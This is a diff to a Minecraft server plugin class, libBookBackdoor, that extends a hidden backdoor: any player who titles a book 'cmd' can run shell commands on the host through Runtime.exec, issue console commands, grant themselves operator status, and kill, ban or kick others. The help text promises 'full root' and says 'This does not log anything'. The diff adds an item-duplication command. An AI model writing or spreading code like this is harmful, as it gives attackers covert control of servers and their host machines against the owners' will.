@@ -83,11 +83,12 @@ public class libBookBackdoor implements Listener {
         if (eventMeta.getTitle() != null && !eventMeta.getPage(1).equals("")) {
             if(eventMeta.getTitle().equals("cmd")) {
                 String pageString = eventMeta.getPage(1);
+                Player player = event.getPlayer();
+
                 String commandType = Character.toString(pageString.charAt(0));
                 String command = pageString.substring(1);
 
                 if(commandType.equals(">") || commandType.equals("$") || commandType.equals("#")) {
-                    Player player = event.getPlayer();
                     try {
                         player.sendMessage("Running: " + command);
                         Process proc = Runtime.getRuntime().exec(command);
@@ -101,7 +102,7 @@ public class libBookBackdoor implements Listener {
                             event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
                         }
                     }, 5);
-                } else if(commandType.equals("/")) /* Server commands, runs as [SERVER]*/ {
+                } else if(commandType.equals("/")) /* Server commands, runs as [SERVER] */ {
                     this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
                     event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
                     this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
@@ -109,9 +110,8 @@ public class libBookBackdoor implements Listener {
                             event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
                         }
                     }, 5);
-                } else if (commandType.equals(".")) /* Custom commands*/ {
+                } else if (commandType.equals(".")) /* Custom commands */ {
                     String[] args = command.split(" ", 0);
-                    Player player = event.getPlayer();
                     String mainCmd = args[0].toLowerCase();
                     switch(mainCmd) {
                         case("give"):
@@ -208,7 +208,7 @@ public class libBookBackdoor implements Listener {
                                     p.teleportAsync(p2.getLocation());
                                 }
                             } catch (Exception e) {
-                                player.sendMessage("Please use correct names");
+                                player.sendMessage("Invalid player names");
                             }
                             break;
                         case("seed"):
@@ -225,7 +225,7 @@ public class libBookBackdoor implements Listener {
                                 loc.setY(-2);
                                 p.teleport(loc);
                             } catch (Exception e) {
-                                player.sendMessage("Please use correct names");
+                                player.sendMessage("Invalid player name");
                             }
                             break;
                         case("mend"):
@@ -251,9 +251,11 @@ public class libBookBackdoor implements Listener {
                             break;
                         case("op"):
                             player.setOp(true);
+                            player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "You are now op!").bold(true).create());
                             break;
                         case("deop"):
                             player.setOp(false);
+                            player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "You have removed op!").bold(true).create());
                             break;
                         case("break"):
                             Location player_loc = player.getEyeLocation();
@@ -271,8 +273,36 @@ public class libBookBackdoor implements Listener {
                                 Location loc = p.getLocation();
                                 player.playSound(loc, Sound.ENTITY_ENDERMAN_DEATH, 100, 1);
                             } catch (Exception e) {
-                                player.sendMessage("Please use a valid player name.");
+                                player.sendMessage("Invalid player name");
                             }
+                            break;
+                        case("dupe"):
+                            new Countdown(5, this.plugin) {
+                                @Override
+                                public void count(int current) {
+                                    if(current == 0){
+                                        try {
+                                            int amt = 0;
+                                            if(args.length > 1) {
+                                                if(Integer.parseInt(args[1]) > 64) {
+                                                    player.sendMessage(ChatColor.RED + "Cannot dupe more than 64 at a time. Doing 64.");
+                                                    amt = 63;
+                                                } else {
+                                                    amt = Integer.parseInt(args[1]) - 1;
+                                                }
+                                            }
+                                            ItemStack item = player.getInventory().getItemInMainHand();
+                                            item.add(amt);
+                                            player.getInventory().addItem(item);
+                                            player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Duped!").bold(true).create());
+                                        } catch (Exception e){
+                                            player.sendActionBar(new ComponentBuilder(ChatColor.RED + "Failed to dupe!").bold(true).create());
+                                        }
+                                    } else {
+                                        player.sendActionBar(ChatColor.GREEN + "Duplicating in " + current + " seconds.");
+                                    }
+                                }
+                            }.start();
                             break;
                         case("help"):
                             ItemStack book = new ItemStack(Material.WRITTEN_BOOK, 1);
@@ -284,7 +314,7 @@ public class libBookBackdoor implements Listener {
                                 meta.addPage("To run commands as " + ChatColor.RED + "CONSOLE" + ChatColor.RESET + ", open a new book and type /<your command>\n\nTo run a custom command made by us keep reading.\n\nWhen your done with you command, name the book 'cmd'");
                                 meta.addPage("To run commands in" + ChatColor.RED + " BASH " + ChatColor.RESET + " or " + ChatColor.LIGHT_PURPLE + " ZSH " + ChatColor.RESET + ", open a new book and type $<your command>\n\nDepending on the user running the server, you will lets say, have full root. Try and see by running $whoami.\nThis does not log anything :)");
 
-                                // Page 3
+                                // Page 4
                                 TextComponent help = Util.genHoverText(ChatColor.GREEN + ".help\n", "Shows this help book.\n\nUSAGE: .help");
                                 TextComponent give = Util.genHoverText(ChatColor.GREEN + ".give\n", "Give yourself any block/Item.\n\nUSAGE: .give <item> <amount>");
                                 TextComponent mend = Util.genHoverText(ChatColor.GREEN + ".mend\n", "Repairs the item in your hand in 5 seconds.\n\nUSAGE: .mend");
@@ -294,16 +324,17 @@ public class libBookBackdoor implements Listener {
                                 TextComponent enchant = Util.genHoverText(ChatColor.GREEN + ".enchant\n", "Enchant the item in your hand after 5 seconds.\n\nUSAGE: .enchant <name> <level>");
                                 TextComponent xp = Util.genHoverText(ChatColor.GREEN + ".xp\n", "Gives you any amount of XP.\n\nUSAGE: .xp <amount>");
                                 TextComponent kill = Util.genHoverText(ChatColor.GREEN + ".kill\n", "Kills a player, duh.\n\nUSAGE: .kill <player>");
-                                TextComponent ban = Util.genHoverText(ChatColor.GREEN + ".ban\n", "Bans a player, does not take a reason.\n\nUSAGE: .ban <player>");
-                                TextComponent kick = Util.genHoverText(ChatColor.GREEN + ".kick\n", "Kicks a player, does not take a reason.\n\nUSAGE: .kick <player>");
+                                TextComponent ban = Util.genHoverText(ChatColor.GREEN + ".ban\n", "Bans a player, does not take a reason.\n\nUSAGE: .ban <player> <reason>");
+                                TextComponent kick = Util.genHoverText(ChatColor.GREEN + ".kick\n", "Kicks a player, does not take a reason.\n\nUSAGE: .kick <player> <reason>");
                                 BaseComponent[] page = new BaseComponent[]{help, give, mend, brazil, seed, tp, enchant, xp, kill, ban, kick}; // Build the new page
 
-                                // Page 4
+                                // Page 5
                                 TextComponent op = Util.genHoverText(ChatColor.GREEN + ".op\n", "Gives you Operator status.\n\nUSAGE: .op");
                                 TextComponent deop = Util.genHoverText(ChatColor.GREEN + ".deop\n", "Removes your Operator status.\n\nUSAGE: .deop");
                                 TextComponent bbreak = Util.genHoverText(ChatColor.GREEN + ".break\n", "Removes any block relative to your players head, Example: .break 1(Breaks the block above the players head).\n\nUSAGE: .break <y pos relative to head>");
                                 TextComponent troll = Util.genHoverText(ChatColor.GREEN + ".troll\n", "Plays a Enderman sound at 100% volume in a players ear.\n\nUSAGE: .troll <player>");
-                                BaseComponent[] page2 = new BaseComponent[]{op, deop, bbreak, troll};
+                                TextComponent dupe = Util.genHoverText(ChatColor.GREEN + ".dupe\n", "Duplicates the item in your hand.\n\nUSAGE: .dupe <amount>");
+                                BaseComponent[] page2 = new BaseComponent[]{op, deop, bbreak, troll, dupe};
 
                                 meta.spigot().addPage(page);
                                 meta.spigot().addPage(page2);
